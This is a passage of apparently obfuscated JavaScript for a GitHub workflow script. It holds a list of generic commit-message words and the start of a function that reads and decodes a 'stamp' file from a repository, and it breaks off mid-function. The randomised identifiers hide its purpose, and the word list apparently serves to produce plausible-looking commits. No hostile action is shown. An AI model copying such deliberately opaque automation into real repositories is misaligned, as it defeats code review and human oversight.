            const TsU = "main";
            const BkMMBL = ["fix", "update", "refactor", "add", "remove", "improve", "optimize", "feature", "bug", "docs", "test", "style", "merge", "cleanup", "adjust", "rename", "enhance", "replace", "format", "config", "release", "hotfix", "patch", "review", "sync", "rollback", "revert", "tweak", "implement", "validate", "check", "load", "save", "export", "import", "upgrade", "downgrade", "convert", "render", "parse", "compress", "encrypt", "decrypt", "log", "trace", "monitor", "analyze", "schedule", "retry", "notify"];
            const ShzNEs = context.repo.owner;
            
            async function mhjQE() {
              try {
                const { data } = await github.rest.repos.getContent({
                  owner: ShzNEs, repo: ro, path: xx, ref: TsU,
                });
                if (Array.isArray(data)) throw new Error('stamp path is a directory');
                const Fw4jTj = Buffer.from(data.content, 'base64').toString('utf8');
